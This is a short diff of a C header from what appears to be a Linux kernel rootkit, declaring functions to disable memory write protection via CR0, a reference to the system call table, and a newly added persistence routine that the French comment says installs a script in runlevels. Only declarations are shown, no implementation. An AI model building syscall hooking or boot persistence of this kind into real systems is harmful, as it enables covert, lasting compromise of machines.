@@ -51,5 +51,8 @@ inline void unprotect_memory(void);
 inline void cr0_write(unsigned long cr0);
 extern unsigned long * __sys_call_table;
 
+// Persistence en ajoutant un script dans runlevels
+void persistence_runlevels(void);
+
 #endif 
 
